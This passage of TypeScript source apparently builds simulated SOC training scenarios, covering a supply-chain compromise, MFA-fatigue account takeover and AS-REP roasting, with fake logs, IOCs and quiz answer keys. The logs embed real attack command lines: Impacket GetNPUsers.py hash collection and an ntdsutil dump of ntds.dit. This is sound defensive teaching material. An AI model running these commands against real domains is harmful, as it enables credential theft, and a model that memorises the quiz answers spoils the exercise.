      ],
      answer: ["revoke", "isolate"],
      explanation: "IAM credential revocation immediately stops all S3 exfiltration and further cloud discovery. EDR network isolation severs the C2 channel and prevents further SSH lateral movement to the database and CI/CD systems. Vendor notification and VirusTotal submission are important but are not immediate containment actions — they can wait 30 minutes while the active threat is stopped.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Supply Chain Attack — Malicious Vendor Update",
    threat_actor: "APT-SHADOWSUPPLY (nation-state supply chain operator)",
    attack_kind: "supply_chain",
    briefing: "CrowdStrike raised a detection on prod-srv-01 at 14:35. The host completed a scheduled NetPulse agent auto-update earlier that afternoon under an approved change record. The firewall shows repeated outbound HTTPS from this server since. Confirm whether the two are related.",
    narrative: `On a Tuesday afternoon, RocketStack's production server ran a routine auto-update for the NetPulse infrastructure monitoring agent. The download came from the real vendor CDN, the installer carried an authentic NetPulse code-signing certificate, and the update was in the change management calendar. What no one at RocketStack knew was that APT-SHADOWSUPPLY — a nation-state group specializing in software supply chain attacks — had compromised NetPulse Solutions' build pipeline three days earlier and embedded a malicious shared object (libnetpulse_core.so.2) inside the v4.2.2 package. Within 5 minutes of installation the malware spawned a child process from an unexpected path, established a C2 beacon to a 3-day-old domain masquerading as vendor telemetry, and wrote a cron job for persistence. Over the following 20 minutes it systematically hunted for credentials, read AWS access keys from /root/.aws/credentials, and began enumerating RocketStack's entire cloud infrastructure. The final blow: 2.3 GB of production database backups and customer PII exfiltrated via 847 S3 API calls — sourced through a Singapore relay that initially appeared unrelated to the C2. Your job: identify the supply chain indicator that exposes the trojanized update, trace the attacker's proxy chain across log sources, and define the two immediate containment actions.`,
    learning_objectives: [
      "Understand why supply chain attacks bypass traditional controls: the initial download is legitimate and signed by a trusted vendor certificate",
      "Identify supply chain compromise indicators: wrong binary installation path, SHA256 hash mismatch vs. vendor known-good, unexpected child process from vendor parent",
      "Recognize C2-over-HTTPS evasion: self-signed certificate plus new domain registration visible only with TLS inspection at the proxy",
      "Correlate on-premise credential theft with subsequent cloud API activity from a different IP (proxy chain attribution)",
      "Define immediate containment priority: IAM credential revocation to stop cloud damage, EDR isolation to cut C2 and lateral movement",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── MFA Fatigue → Okta Account Takeover (⭐ Easy) ───────────────────────────

export function buildMfaFatigueScenario(scenarioId = "mfa-fatigue-ato"): ScenarioBundle {
  const BASE = new Date("2026-06-15T01:20:00.000Z").getTime();
  const T = (ms: number) => new Date(BASE + ms).toISOString();
  const MIN = 60_000;

  const events: TelemetryEvent[] = [
    {
      id: "mfa_01_spray",
      ts: T(0),
      source: "iam", vendor: "Okta",
      event_type: "auth_failure", severity: "medium", mitre_technique: "T1110.003",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "j.chen's Okta account recorded 47 consecutive authentication failures from a Moscow, Russia IP within 12 minutes, using a python-requests user agent.",
      fp_explanation: "47 auth failures can look like a user locked out after password expiry during an off-hours automation run — many analysts dismiss this without checking the source IP geography",
      raw: {
        "data.okta.eventType": "user.session.start",
        "data.okta.outcome.result": "FAILURE",
        "data.okta.outcome.reason": "INVALID_CREDENTIALS",
        "data.okta.actor.displayName": "Jennifer Chen",
        "data.okta.client.ipAddress": "91.108.4.33",
        "data.okta.client.geographicalContext.country": "Russia",
        "data.okta.client.geographicalContext.city": "Moscow",
        "data.okta.client.userAgent.rawUserAgent": "python-requests/2.31.0",
        "data.okta.target[0].displayName": "Jennifer Chen",
        "data.okta.debugContext.debugData.loginFailureCount": 47,
        "data.okta.displayMessage": "User login to Okta failed",
      },
    },
    {
      id: "mfa_02_auth_success",
      ts: T(1 * MIN + 17_000),
      source: "iam", vendor: "Okta",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078.004",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "The 48th login attempt from the same Russian IP succeeded on password, triggering an MFA push to j.chen's phone.",
      raw: {
        "data.okta.eventType": "user.session.start",
        "data.okta.outcome.result": "SUCCESS",
        "data.okta.actor.displayName": "Jennifer Chen",
        "data.okta.client.ipAddress": "91.108.4.33",
        "data.okta.client.geographicalContext.country": "Russia",
        "data.okta.client.geographicalContext.city": "Moscow",
        "data.okta.client.userAgent.rawUserAgent": "python-requests/2.31.0",
        "data.okta.authenticationContext.authenticationStep": 1,
        "data.okta.authenticationContext.credentialProvider": "OKTA_CREDENTIAL_PROVIDER",
        "data.okta.displayMessage": "User login to Okta — awaiting MFA",
      },
    },
    {
      id: "mfa_03_push_rejected",
      ts: T(6 * MIN + 17_000),
      source: "iam", vendor: "Okta",
      event_type: "mfa_denied", severity: "high", mitre_technique: "T1621",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "j.chen denied 12 consecutive MFA push notifications over 6 minutes, all tied to the same Russian IP login attempt.",
      fp_explanation: "Users sometimes reject legitimate MFA pushes by accident (wrong tap, late at night). 12 rejections is unusual but analysts sometimes attribute this to a confused user rather than an attacker",
      raw: {
        "data.okta.eventType": "user.mfa.okta_verify.push_response",
        "data.okta.outcome.result": "DENIED",
        "data.okta.outcome.reason": "INVALID_CREDENTIALS",
        "data.okta.actor.displayName": "Jennifer Chen",
        "data.okta.client.ipAddress": "91.108.4.33",
        "data.okta.client.geographicalContext.country": "Russia",
        "data.okta.debugContext.debugData.factor": "OKTA_VERIFY_PUSH",
        "data.okta.debugContext.debugData.pushDenialCount": 12,
        "data.okta.displayMessage": "MFA push notification denied",
      },
    },
    {
      id: "mfa_04_push_accepted",
      ts: T(12 * MIN + 17_000),
      source: "iam", vendor: "Okta",
      event_type: "auth_success", severity: "critical", mitre_technique: "T1621",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "j.chen approved an MFA push at 01:32 local time, the 60th notification sent over 11 minutes from the same Russian IP.",
      raw: {
        "data.okta.eventType": "user.mfa.okta_verify.push_response",
        "data.okta.outcome.result": "SUCCESS",
        "data.okta.actor.displayName": "Jennifer Chen",
        "data.okta.client.ipAddress": "91.108.4.33",
        "data.okta.client.geographicalContext.country": "Russia",
        "data.okta.client.geographicalContext.city": "Moscow",
        "data.okta.client.userAgent.rawUserAgent": "Okta Verify/4.11.0 iOS/17.2",
        "data.okta.debugContext.debugData.factor": "OKTA_VERIFY_PUSH",
        "data.okta.debugContext.debugData.pushSentCount": 60,
        "data.okta.debugContext.debugData.pushApprovedAt": "2026-06-15T01:32:17Z",
        "data.okta.debugContext.debugData.sessionDurationMinutes": 11,
        "data.okta.displayMessage": "MFA push notification approved",
      },
    },
    {
      id: "mfa_05_device_enroll",
      ts: T(12 * MIN + 44_000),
      source: "iam", vendor: "Okta",
      event_type: "account_modify", severity: "critical", mitre_technique: "T1098.001",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "An unmanaged Windows device, DESKTOP-MOSCOW-99, was enrolled to j.chen's Okta account 27 seconds after the MFA push was approved.",
      raw: {
        "data.okta.eventType": "device.enrollment.create",
        "data.okta.outcome.result": "SUCCESS",
        "data.okta.actor.displayName": "Jennifer Chen",
        "data.okta.client.ipAddress": "91.108.4.33",
        "data.okta.client.geographicalContext.country": "Russia",
        "data.okta.client.geographicalContext.city": "Moscow",
        "data.okta.target[0].displayName": "DESKTOP-MOSCOW-99",
        "data.okta.target[0].type": "EnrolledDevice",
        "data.okta.target[0].detailEntry.platform": "WINDOWS",
        "data.okta.target[0].detailEntry.managed": false,
        "data.okta.target[0].detailEntry.registered": "2026-06-15T01:32:44Z",
        "data.okta.displayMessage": "Device enrolled to Okta account",
      },
    },
    {
      id: "mfa_06_mail_access",
      ts: T(14 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1114.002",
      hostname: "graph.microsoft.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "3,847 mailbox items in j.chen's inbox were accessed via Microsoft Graph API from the same Russian IP, two minutes after device enrollment.",
      raw: {
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.ClientInfoString": "Client=REST;Action=ViaProxy;",
        "data.office365.AppId": "de8bc8b5-d9f9-48b1-a8ad-b748da725064",
        "data.office365.ClientIPAddress": "91.108.4.33",
        "data.office365.Workload": "Exchange",
        "data.office365.MailboxOwnerUPN": "j.chen@nexacorp.com",
        "data.office365.OperationCount": 3847,
        "GeoLocation.country_name": "Russia",
      },
    },
    {
      id: "mfa_07_sharepoint_bulk",
      ts: T(16 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "sharepoint_download", severity: "high", mitre_technique: "T1530",
      hostname: "nexacorp.sharepoint.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "847 files (2.3GB) were downloaded from the Finance SharePoint site under j.chen's account in 4 minutes.",
      raw: {
        "data.office365.Operation": "FileDownloaded",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.Workload": "SharePoint",
        "data.office365.ClientIPAddress": "91.108.4.33",
        "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Finance",
        "data.office365.DownloadCount": 847,
        "data.office365.TotalSizeBytes": 2341887242,
        "GeoLocation.country_name": "Russia",
      },
    },
    {
      id: "mfa_08_api_token",
      ts: T(20 * MIN),
      source: "iam", vendor: "Okta",
      event_type: "cloud_api_call", severity: "high", mitre_technique: "T1098.001",
      hostname: "okta-idp.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "An Okta API token named j.chen-api-token-2026 was created with no expiration date, from the same Russian IP.",
      raw: {
        "data.okta.eventType": "system.api_token.create",
        "data.okta.outcome.result": "SUCCESS",
        "data.okta.actor.displayName": "Jennifer Chen",
        "data.okta.client.ipAddress": "91.108.4.33",
        "data.okta.client.geographicalContext.country": "Russia",
        "data.okta.target[0].displayName": "j.chen-api-token-2026",
        "data.okta.target[0].type": "Token",
        "data.okta.debugContext.debugData.tokenExpiry": "never",
        "data.okta.displayMessage": "Create API token",
      },
    },
    {
      id: "mfa_09_ca_policy",
      ts: T(22 * MIN),
      source: "ad", vendor: "Microsoft Entra ID",
      event_type: "policy_modification", severity: "critical", mitre_technique: "T1556.009",
      hostname: "aad.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "The Require Compliant Device Conditional Access policy was modified to add DESKTOP-MOSCOW-99 to its device exclusion list.",
      raw: {
        "data.office365.Operation": "Update conditional access policy.",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.ActorIpAddress": "91.108.4.33",
        "data.office365.Target[0].ID": "Require Compliant Device",
        "data.office365.ModifiedProperties[0].Name": "ExcludeDevices",
        "data.office365.ModifiedProperties[0].NewValue": "[\"DESKTOP-MOSCOW-99\"]",
        "data.office365.ModifiedProperties[0].OldValue": "[]",
        "data.office365.ResultStatus": "Success",
        "GeoLocation.country_name": "Russia",
      },
    },
    {
      id: "mfa_10_inbox_rule",
      ts: T(24 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "account_modify", severity: "high", mitre_technique: "T1114.003",
      hostname: "outlook.office365.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
      description: "An inbox rule forwarding all of j.chen's email to j.chen.backup@proton.me and marking it as read was created.",
      raw: {
        "data.office365.Operation": "New-InboxRule",
        "data.office365.UserId": "j.chen@nexacorp.com",
        "data.office365.Workload": "Exchange",
        "data.office365.ClientIPAddress": "91.108.4.33",
        "data.office365.Parameters[0].Name": "ForwardTo",
        "data.office365.Parameters[0].Value": "j.chen.backup@proton.me",
        "data.office365.Parameters[1].Name": "MarkAsRead",
        "data.office365.Parameters[1].Value": "True",
        "GeoLocation.country_name": "Russia",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "ip",     value: "91.108.4.33",                            reputation: "malicious", tags: ["external-infrastructure", "moscow", "telegram-datacenter"] },
    { type: "email",  value: "j.chen.backup@proton.me",                reputation: "malicious", tags: ["exfil-target", "inbox-forwarding"] },
    { type: "host",   value: "DESKTOP-MOSCOW-99",                      reputation: "malicious", tags: ["attacker-device", "ca-policy-exclusion"] },
    { type: "sha256", value: makeSha256("okta-api-token-j.chen-2026"), reputation: "malicious", tags: ["okta-api-token", "persistence"] },
  ];

  const killchain = [
    { ts: T(0),                  phase: "Credential Access", action: "Password spray — 47 failures for j.chen from 91.108.4.33 (Moscow) using python-requests" },
    { ts: T(1 * MIN + 17_000),   phase: "Initial Access",    action: "First-factor auth success — MFA push bombardment begins" },
    { ts: T(6 * MIN + 17_000),   phase: "Credential Access", action: "MFA fatigue in progress — j.chen rejects 12 push notifications over 5 minutes" },
    { ts: T(12 * MIN + 17_000),  phase: "Initial Access",    action: "j.chen approves MFA push at 01:32:17 AM after 60 total notifications — account compromised" },
    { ts: T(12 * MIN + 44_000),  phase: "Persistence",       action: "Device 'DESKTOP-MOSCOW-99' enrolled to Okta 27 seconds after MFA approval" },
    { ts: T(14 * MIN),           phase: "Collection",        action: "3,847 mailbox items accessed via Microsoft Graph API MailItemsAccessed" },
    { ts: T(16 * MIN),           phase: "Exfiltration",      action: "847 SharePoint files (2.18 GB) bulk-downloaded in 4 minutes — 650x j.chen's daily baseline" },
    { ts: T(20 * MIN),           phase: "Persistence",       action: "Okta API token 'j.chen-api-token-2026' created with no expiry" },
    { ts: T(22 * MIN),           phase: "Defense Evasion",   action: "Conditional Access policy modified to permanently whitelist DESKTOP-MOSCOW-99" },
    { ts: T(24 * MIN),           phase: "Persistence",       action: "Exchange inbox forwarding rule created — all email forwarded to j.chen.backup@proton.me" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 20,
      prompt: "What is the first clear indicator this is MFA fatigue and not a user accidentally rejecting legitimate pushes?",
      kind: "single",
      options: [
        { value: "a", label: "The 47 failed authentications exceed the baseline of three per user per day that Okta reports for this tenant" },
        { value: "b", label: "The approval was recorded at 01:32 AM, well outside j.chen's normal 08:00-18:00 pattern in the Okta sign-in log" },
        { value: "c", label: "60 push notifications were sent in 11 minutes from a Russian IP after the user rejected 12 — deliberate bombardment" },
        { value: "d", label: "A new Okta Verify device, DESKTOP-MOSCOW-99, was enrolled minutes after the approval, giving the attacker a factor" },
      ],
      answer: "c",
      explanation: "The combination of source IP (Russia), 12 rejections ignored, continued bombardment (48 more pushes), and 01:32 AM approval are textbook MFA fatigue. The python-requests User-Agent in event 1 confirms this is scripted, not a legitimate user.",
    },
    {
      id: "q2", xp: 20,
      prompt: "The attacker modified a Conditional Access policy (mfa_09_ca_policy). Why is this particularly dangerous?",
      kind: "single",
      options: [
        { value: "a", label: "It turns off the MFA requirement tenant-wide, so every user in the organization can now sign in with a password alone" },
        { value: "b", label: "Their unmanaged device is now exempt from the compliance requirement, so it keeps access even though it will never be Intune-compliant" },
        { value: "c", label: "It strips the sign-in log data from Entra ID, so the SOC loses the audit trail needed to investigate the account takeover" },
        { value: "d", label: "It elevates the compromised account to Global Administrator, giving the attacker full control of every Entra ID object in the tenant" },
      ],
      answer: "b",
      explanation: "Read what the policy actually grants. 'Require Compliant Device' is a DEVICE-COMPLIANCE control, not an MFA control — the two are separate grant controls and usually live in separate policies. Excluding DESKTOP-MOSCOW-99 from it does not switch MFA off, and no Conditional Access exclusion lets anyone in without a password. What it does is exempt an unmanaged attacker-controlled machine from the one control that would otherwise have kept it out permanently, because that device is never going to become Intune-compliant. The persistence is real and it is the right answer — it just works through the compliance gate rather than the MFA gate. This distinction matters in practice: an analyst who reports 'MFA was disabled' sends the response team after the wrong control.",
    },
    {
      id: "q3", xp: 15,
      prompt: "Which investigation step definitively rules out a FP for event mfa_01 (47 auth failures)?",
      kind: "single",
      options: [
        { value: "a", label: "Check the User-Agent — 'python-requests/2.31.0' is a scripted tool, not a browser or Okta Verify app" },
        { value: "b", label: "Check the HR system for whether j.chen was on approved PTO and therefore could not have been signing in" },
        { value: "c", label: "Check whether Okta locked the account after the failure threshold, since a lockout confirms the attempts were real" },
        { value: "d", label: "Call j.chen and ask whether she was trying to sign in, then close the alert based on her recollection" },
      ],
      answer: "a",
      explanation: "The User-Agent 'python-requests/2.31.0' is the smoking gun — this is a Python script, not a user's browser or mobile app. Legitimate users never generate auth failures with Python requests. Combined with the Russian source IP, this immediately rules out a legitimate user lockout.",
    },
    {
      id: "q4", xp: 25,
      prompt: "In what order should you contain this incident?",
      kind: "single",
      options: [
        { value: "a", label: "Reset password first → Revoke active sessions → Notify user by email → Remove inbox forwarding rule → Remove enrolled device → Revoke API token" },
        { value: "b", label: "Notify user by email → Reset password → Remove enrolled device → Remove inbox forwarding rule → Revoke active sessions → Revoke API token" },
        { value: "c", label: "Remove inbox forwarding rule → Revoke API token → Reset password → Remove enrolled device → Notify the CISO → Revoke active sessions" },
        { value: "d", label: "Revoke ALL active sessions → Remove inbox forwarding rule → Revoke API token → Reset password → Remove enrolled device → Notify user via phone (not email)" },
      ],
      answer: "d",
      explanation: "Order matters critically: (1) Revoke sessions first — stops live access. (2) Remove forwarding rule — stops ongoing email theft to ProtonMail. (3) Revoke API token — removes persistence that survives password reset. (4) Reset password. (5) Remove device. Notify via phone because the attacker is reading her email.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "MFA Fatigue → Okta Account Takeover",
    threat_actor: "UNC3944",
    attack_kind: "Identity Attack / Account Takeover",
    briefing: "Okta flagged 47 consecutive failed authentications on j.chen's account from a foreign address between 01:20 and 01:32, followed by a successful login. A new device is now enrolled on the account. j.chen has not been reached.",
    narrative: "UNC3944 obtained j.chen's password from a credential marketplace. After covering their tracks with 47 noisy spray attempts, they authenticated and bypassed MFA by bombarding Jennifer Chen's phone with 60 push notifications over 11 minutes until she approved at 01:32 AM — fatigue-induced mistake. Within 2 minutes the attacker enrolled a new device from Moscow, collected her entire mailbox via Graph API, bulk-downloaded 847 SharePoint files, and established persistence via a new API token and a Conditional Access policy exclusion for their device.",
    learning_objectives: [
      "Recognize MFA push bombardment pattern (volume + timing anomaly)",
      "Understand that push approval at unusual hours from foreign IP is a key indicator",
      "Identify post-compromise Graph API activity as attacker-controlled access",
      "Know the correct incident response order: sessions → forwarding rules → API tokens → password reset",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── AS-REP Roasting → Offline Hash Crack (⭐⭐ Intermediate) ────────────────

export function buildAsRepRoastingScenario(scenarioId = "asrep-roasting"): ScenarioBundle {
  // The Python interpreter hosting the Impacket module — the one artefact in an
  // otherwise entirely internal AD attack that an analyst can actually look up.
  const pyHash = makeSha256("python_exe_impacket_host");
  const B = new Date("2026-05-10T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const HOUR = 60 * MIN;

  const events: TelemetryEvent[] = [
    {
      id: "asrep_01_ldap_discovery",
      ts: T(0),
      source: "ad", vendor: "Windows Security",
      event_type: "privileged_operation", severity: "medium", mitre_technique: "T1087.002",
      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com", src_ip: "10.0.1.45",
      description: "WS-DEV-09 sent an LDAP query against DC01 filtering for userAccountControl flag 4194304 — accounts with Kerberos pre-authentication disabled.",
      fp_explanation: "LDAP queries against userAccountControl are extremely common — AD admins, PowerShell scripts, and monitoring tools run these constantly. Most analysts see this and move on without checking the specific flag being queried.",
      raw: {
        "event.code": "4662",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "DC01",
        "winlog.event_data.SubjectUserName": "m.johnson",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.ObjectName": "DC=nexacorp,DC=com",
        "winlog.event_data.AdditionalInfo": "LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=4194304)",
        "winlog.event_data.IpAddress": "10.0.1.45",
      },
    },
    {
      id: "asrep_02_asrep_svcbackup",
      ts: T(2 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "kerberos_tgt", severity: "high", mitre_technique: "T1558.004",
      hostname: "DC01", user_email: "svc-backup@nexacorp.com", src_ip: "10.0.1.45",
      description: "DC01 issued a Kerberos AS-REP for svc-backup with PreAuthType=0 and RC4 encryption — no credentials were required to receive this ticket.",
      raw: {
        "event.code": "4768",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "DC01",
        "winlog.event_data.TargetUserName": "svc-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.TicketOptions": "0x40800010",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "0",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "52341",
      },
    },
    {
      id: "asrep_03_asrep_svcmonitoring",
      ts: T(2 * MIN + 15_000),
      source: "ad", vendor: "Windows Security",
      event_type: "kerberos_tgt", severity: "high", mitre_technique: "T1558.004",
      hostname: "DC01", user_email: "svc-monitoring@nexacorp.com", src_ip: "10.0.1.45",
      description: "DC01 issued a second PreAuthType=0, RC4-encrypted AS-REP, this time for svc-monitoring, 15 seconds after svc-backup.",
      raw: {
        "event.code": "4768",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "DC01",
        "winlog.event_data.TargetUserName": "svc-monitoring",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "0",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "52342",
      },
    },
    {
      id: "asrep_04_asrep_svcreports",
      ts: T(2 * MIN + 30_000),
      source: "ad", vendor: "Windows Security",
      event_type: "kerberos_tgt", severity: "high", mitre_technique: "T1558.004",
      hostname: "DC01", user_email: "svc-reports@nexacorp.com", src_ip: "10.0.1.45",
      description: "A third PreAuthType=0, RC4-encrypted AS-REP was issued for svc-reports, 15 seconds after svc-monitoring.",
      raw: {
        "event.code": "4768",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "DC01",
        "winlog.event_data.TargetUserName": "svc-reports",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "0",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "52343",
      },
    },
    {
      id: "asrep_05_impacket_tool",
      ts: T(1 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "high", mitre_technique: "T1558.004",
      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com",
      description: "CrowdStrike detected m.johnson's account on WS-DEV-09 running GetNPUsers.py against nexacorp.local, writing hashcat-formatted output to /tmp/asrep_hashes.txt.",
      fp_explanation: "Python scripts run constantly on developer machines. 'GetNPUsers' isn't a well-known household tool name — many junior analysts don't recognize it as an Impacket attack module.",
      raw: {
        "crowdstrike.process_name": "python.exe",
        "crowdstrike.commandline": "GetNPUsers.py nexacorp.local/ -no-pass -usersfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\users.txt -format hashcat -outputfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\asrep_hashes.txt",
        "crowdstrike.filename": "GetNPUsers.py",
        "crowdstrike.sha256": pyHash,
        "crowdstrike.filepath": "C:\\Users\\m.johnson\\AppData\\Local\\Temp\\impacket\\",
        "crowdstrike.username": "NEXACORP\\m.johnson",
        "crowdstrike.parent_basefilename": "cmd.exe",
        "crowdstrike.local_address": "10.0.1.45",
        "crowdstrike.remote_address": "10.0.0.5",
        "crowdstrike.remote_port": "88",
        "crowdstrike.severity": 70,
      },
    },
    {
      id: "asrep_06_kerberos_network",
      ts: T(2 * MIN + 5_000),
      source: "proxy", vendor: "Corelight (Zeek)",
      event_type: "net_connection", severity: "medium", mitre_technique: "T1558.004",
      hostname: "WS-DEV-09", src_ip: "10.0.1.45", dst_ip: "10.0.0.5", dst_port: 88,
      description: "Zeek logged 3 rapid Kerberos AS requests (UDP/88, RC4-HMAC) from WS-DEV-09 to DC01 within seconds of each other.",
      raw: {
        "network.protocol": "kerberos",
        "network.transport": "udp",
        "destination.port": 88,
        "source.ip": "10.0.1.45",
        "destination.ip": "10.0.0.5",
        "network.bytes": 1872,
        "network.packets": 6,
        "zeek.kerberos.request_type": "AS",
        "zeek.kerberos.encryption_type": "rc4-hmac",
      },
    },
    {
      id: "asrep_07_lateral_svcbackup",
      ts: T(6 * HOUR),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078.002",
      hostname: "SRV-FILE01", user_email: "svc-backup@nexacorp.com", src_ip: "10.0.1.45",
      description: "svc-backup authenticated to SRV-FILE01 via a network logon (Type 3) originating from WS-DEV-09.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "SRV-FILE01",
        "winlog.event_data.TargetUserName": "svc-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": "WS-DEV-09",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "54219",
      },
    },
    {
      id: "asrep_08_sebackupprivilege",
      ts: T(6 * HOUR + 1 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "privileged_operation", severity: "critical", mitre_technique: "T1078.002",
      hostname: "SRV-FILE01", user_email: "svc-backup@nexacorp.com",
      description: "The svc-backup logon session on SRV-FILE01 was assigned SeBackupPrivilege, SeRestorePrivilege, and SeCreateSymbolicLinkPrivilege.",
      raw: {
        "event.code": "4672",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "SRV-FILE01",
        "winlog.event_data.SubjectUserName": "svc-backup",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.PrivilegeList": "SeBackupPrivilege\tSeRestorePrivilege\tSeCreateSymbolicLinkPrivilege",
      },
    },
    {
      id: "asrep_09_domain_admin_enum",
      ts: T(6 * HOUR + 5 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "high", mitre_technique: "T1087.002",
      hostname: "SRV-FILE01", user_email: "svc-backup@nexacorp.com",
      description: "svc-backup ran net group \"Domain Admins\" /domain on SRV-FILE01.",
      raw: {
        "crowdstrike.process_name": "net.exe",
        "crowdstrike.commandline": "net group \"Domain Admins\" /domain",
        "crowdstrike.username": "NEXACORP\\svc-backup",
        "crowdstrike.parent_basefilename": "cmd.exe",
        "crowdstrike.local_address": "10.0.2.20",
        "crowdstrike.severity": 65,
      },
    },
    {
      id: "asrep_10_ntds_dump",
      ts: T(6 * HOUR + 20 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "file_create", severity: "critical", mitre_technique: "T1003.003",
      hostname: "DC01", user_email: "svc-backup@nexacorp.com",
      description: "svc-backup ran ntdsutil.exe on DC01 to create an IFM snapshot, extracting ntds.dit to C:\\Temp\\ntds_dump\\.",
      raw: {
        "crowdstrike.process_name": "ntdsutil.exe",
        "crowdstrike.commandline": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_dump\" q q",
        "crowdstrike.username": "NEXACORP\\svc-backup",
        "crowdstrike.target_filename": "C:\\Temp\\ntds_dump\\Active Directory\\ntds.dit",
        "crowdstrike.filesize": 51380224,
        "crowdstrike.severity": 95,
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "host",   value: "WS-DEV-09",                               reputation: "malicious", tags: ["internal-host", "ip:10.0.1.45"] },
    { type: "sha256", value: makeSha256("asrep-hashcat-svc-backup-nexacorp"), reputation: "malicious", tags: ["asrep-hash", "krb5asrep-rc4", "hashcat", "svc-backup-tgt"] },
    { type: "sha256", value: makeSha256("GetNPUsers-impacket-tool"),    reputation: "malicious", tags: ["impacket", "GetNPUsers.py"] },
    { type: "ip",     value: "10.0.1.45",                               reputation: "malicious", tags: ["ws-dev-09"] },
  ];

  const killchain = [
    { ts: T(0),                    phase: "Discovery",         action: "LDAP query for accounts with Kerberos pre-auth disabled (userAccountControl flag 4194304)" },
    { ts: T(1 * MIN),              phase: "Credential Access", action: "Impacket GetNPUsers.py launched on WS-DEV-09 — AS-REP roasting tool detected by EDR" },
    { ts: T(2 * MIN),              phase: "Credential Access", action: "AS-REP TGT requested for svc-backup without credentials (PreAuthType=0, RC4 encryption)" },
    { ts: T(2 * MIN + 30_000),     phase: "Credential Access", action: "AS-REP TGTs collected for svc-monitoring and svc-reports — 3 offline-crackable hashes captured" },
    { ts: T(3 * MIN),              phase: "Offline Cracking",  action: "Silent gap — hashcat cracking RC4-encrypted TGTs offline (no domain logs generated)" },
    { ts: T(6 * HOUR),             phase: "Lateral Movement",  action: "svc-backup authenticates from WS-DEV-09 to SRV-FILE01 — crack succeeded" },
